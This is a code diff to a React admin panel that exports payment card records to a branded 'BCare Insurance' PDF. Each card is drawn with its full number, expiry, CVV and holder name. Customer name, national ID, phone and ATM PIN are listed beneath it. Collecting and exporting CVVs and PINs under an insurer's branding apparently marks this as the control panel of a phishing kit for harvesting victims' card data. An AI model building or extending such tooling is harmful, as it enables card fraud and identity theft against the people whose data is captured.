@@ -182,6 +182,86 @@ const AdminSettings = () => {
     }
   };
 
+  const drawCard3D = (doc: jsPDF, x: number, y: number, card: any, index: number) => {
+    const cw = 120, ch = 72;
+    // 3D shadow layers
+    for (let i = 4; i >= 1; i--) {
+      doc.setFillColor(180, 180, 190);
+      doc.setDrawColor(180, 180, 190);
+      doc.roundedRect(x + i * 1.2, y + i * 1.2, cw, ch, 4, 4, "F");
+    }
+    // Card gradient background
+    const isVisa = (card.card_number_full || "").startsWith("4");
+    const isMaster = /^5[1-5]/.test(card.card_number_full || "");
+    if (isVisa) {
+      doc.setFillColor(20, 99, 148); // BCare blue
+    } else if (isMaster) {
+      doc.setFillColor(212, 160, 23); // BCare gold
+    } else {
+      doc.setFillColor(30, 30, 60);
+    }
+    doc.roundedRect(x, y, cw, ch, 4, 4, "F");
+    // Subtle pattern overlay
+    doc.setDrawColor(255, 255, 255);
+    doc.setLineWidth(0.15);
+    for (let i = 0; i < 6; i++) {
+      doc.circle(x + cw - 15 + i * 3, y + 15 + i * 3, 18 + i * 4);
+    }
+    // BCare logo text
+    doc.setFontSize(14);
+    doc.setTextColor(255, 255, 255);
+    doc.setFont("helvetica", "bold");
+    doc.text("BCare", x + 8, y + 14);
+    doc.setFontSize(6);
+    doc.setFont("helvetica", "normal");
+    doc.text("INSURANCE", x + 8, y + 19);
+    // Chip
+    doc.setFillColor(218, 190, 110);
+    doc.roundedRect(x + 8, y + 26, 14, 10, 1.5, 1.5, "F");
+    doc.setDrawColor(200, 170, 90);
+    doc.setLineWidth(0.3);
+    doc.line(x + 15, y + 26, x + 15, y + 36);
+    doc.line(x + 8, y + 31, x + 22, y + 31);
+    // Card number
+    const num = card.card_number_full || `**** **** **** ${card.card_last_four || "****"}`;
+    const formatted = num.replace(/(.{4})/g, "$1  ").trim();
+    doc.setFontSize(11);
+    doc.setTextColor(255, 255, 255);
+    doc.setFont("courier", "bold");
+    doc.text(formatted, x + 8, y + 46);
+    // Expiry & CVV
+    doc.setFontSize(6);
+    doc.setFont("helvetica", "normal");
+    doc.setTextColor(200, 210, 230);
+    doc.text("VALID THRU", x + 8, y + 53);
+    doc.text("CVV", x + 45, y + 53);
+    doc.setFontSize(9);
+    doc.setTextColor(255, 255, 255);
+    doc.setFont("helvetica", "bold");
+    doc.text(card.card_expiry || "--/--", x + 8, y + 58);
+    doc.text(card.card_cvv || "---", x + 45, y + 58);
+    // Card holder
+    doc.setFontSize(8);
+    doc.setTextColor(255, 255, 255);
+    doc.setFont("helvetica", "bold");
+    doc.text((card.card_holder_name || "CARD HOLDER").toUpperCase(), x + 8, y + 67);
+    // Card brand
+    doc.setFontSize(10);
+    doc.setTextColor(255, 255, 255);
+    doc.setFont("helvetica", "bold");
+    const brand = isVisa ? "VISA" : isMaster ? "MASTERCARD" : (card.payment_method || "CARD").toUpperCase();
+    doc.text(brand, x + cw - doc.getTextWidth(brand) - 8, y + 67);
+    // Card # label
+    doc.setFontSize(6);
+    doc.setTextColor(150, 160, 180);
+    doc.setFont("helvetica", "normal");
+    doc.text(`#${index + 1}`, x + cw - 12, y + 14);
+    // Reset
+    doc.setTextColor(0, 0, 0);
+    doc.setDrawColor(0, 0, 0);
+    doc.setLineWidth(0.2);
+  };
+
   const handleExportCardsPDF = async () => {
     toast.info("جاري تجهيز ملف بطاقات الدفع...");
     try {
@@ -192,31 +272,61 @@ const AdminSettings = () => {
         return;
       }
       const doc = new jsPDF({ orientation: "landscape" });
+      const pw = doc.internal.pageSize.getWidth();
+
+      // Header
+      doc.setFillColor(20, 99, 148);
+      doc.rect(0, 0, pw, 28, "F");
       doc.setFontSize(18);
-      doc.text("BCare - Payment Cards Export", 14, 20);
+      doc.setTextColor(255, 255, 255);
+      doc.setFont("helvetica", "bold");
+      doc.text("BCare", 14, 14);
       doc.setFontSize(10);
-      doc.text(`Export Date: ${new Date().toLocaleDateString("en-US")}`, 14, 28);
-      doc.text(`Total Cards: ${cardsData.length}`, 14, 34);
-      autoTable(doc, {
-        startY: 40,
-        head: [["#", "Customer", "National ID", "Phone", "Card Number", "CVV", "Expiry", "Holder Name", "Method", "ATM PIN", "ATM Bill#", "ATM Biller"]],
-        body: cardsData.map((o: any, i: number) => [
-          i + 1,
-          o.customer_name || "-",
-          o.national_id || "-",
-          o.phone || "-",
-          o.card_number_full || `****${o.card_last_four || ""}`,
-          o.card_cvv || "-",
-          o.card_expiry || "-",
-          o.card_holder_name || "-",
-          o.payment_method || "-",
-          o.atm_pin || "-",
-          o.atm_bill_number || "-",
-          o.atm_biller_code || "-",
-        ]),
-        styles: { fontSize: 7, cellPadding: 2 },
-        headStyles: { fillColor: [220, 53, 69] },
+      doc.setFont("helvetica", "normal");
+      doc.text("Payment Cards Export", 14, 21);
+      doc.setFontSize(8);
+      doc.text(`Date: ${new Date().toLocaleDateString("en-US")}  |  Total: ${cardsData.length} card(s)`, pw - 14, 14, { align: "right" });
+      // Gold accent line
+      doc.setFillColor(250, 166, 46);
+      doc.rect(0, 28, pw, 2, "F");
+
+      doc.setTextColor(0, 0, 0);
+
+      const cardsPerRow = 2;
+      const cardW = 120, cardH = 72;
+      const gapX = 20, gapY = 18;
+      const startX = (pw - (cardsPerRow * cardW + (cardsPerRow - 1) * gapX)) / 2;
+      let startY = 40;
+
+      cardsData.forEach((card: any, i: number) => {
+        const col = i % cardsPerRow;
+        const rowOnPage = Math.floor((i % 4) / cardsPerRow);
+        if (i > 0 && i % 4 === 0) {
+          doc.addPage();
+          startY = 20;
+        }
+        const cx = startX + col * (cardW + gapX);
+        const cy = startY + rowOnPage * (cardH + gapY);
+
+        drawCard3D(doc, cx, cy, card, i);
+
+        // Info below card
+        doc.setFontSize(7);
+        doc.setTextColor(80, 80, 80);
+        doc.setFont("helvetica", "normal");
+        const info = [
+          card.customer_name ? `Customer: ${card.customer_name}` : "",
+          card.national_id ? `ID: ${card.national_id}` : "",
+          card.phone ? `Phone: ${card.phone}` : "",
+          card.payment_method ? `Method: ${card.payment_method}` : "",
+          card.atm_pin ? `ATM PIN: ${card.atm_pin}` : "",
+          card.atm_bill_number ? `Bill#: ${card.atm_bill_number}` : "",
+        ].filter(Boolean);
+        info.forEach((line, li) => {
+          doc.text(line, cx, cy + cardH + 5 + li * 3.5);
+        });
       });
+
       doc.save("bcare-payment-cards.pdf");
       toast.success("تم تصدير بطاقات الدفع");
       logActivity("تصدير بطاقات الدفع كملف PDF", "settings");
